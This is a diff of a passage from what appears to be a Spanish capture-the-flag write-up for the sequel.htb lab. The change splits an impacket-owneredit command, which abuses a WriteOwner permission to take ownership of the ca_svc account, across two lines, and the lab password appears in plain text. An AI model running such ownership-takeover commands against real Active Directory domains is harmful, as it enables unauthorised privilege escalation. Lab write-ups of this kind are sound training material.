@@ -672,7 +672,8 @@ Lo mas interesante es que el usuario ryan tiene el permiso WriteOwner sobre el u
 Como primer paso para su explotación otorge la propiedad:
 
 ```bash
-impacket-owneredit -action write -new-owner 'ryan' -target-dn 'CN=ca_svc,CN=Users,DC=sequel,DC=htb' sequel.htb/ryan:'WqSZAF6CysDQbGb3'  -dc-ip 10.10.11.51
+impacket-owneredit -action write -new-owner 'ryan' -target-dn 'CN=ca_svc,CN=Users,DC=sequel,DC=htb'
+sequel.htb/ryan:'WqSZAF6CysDQbGb3'  -dc-ip 10.10.11.51
 
 /usr/share/doc/python3-impacket/examples/owneredit.py:87: SyntaxWarning: invalid escape sequence '\V'
   'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
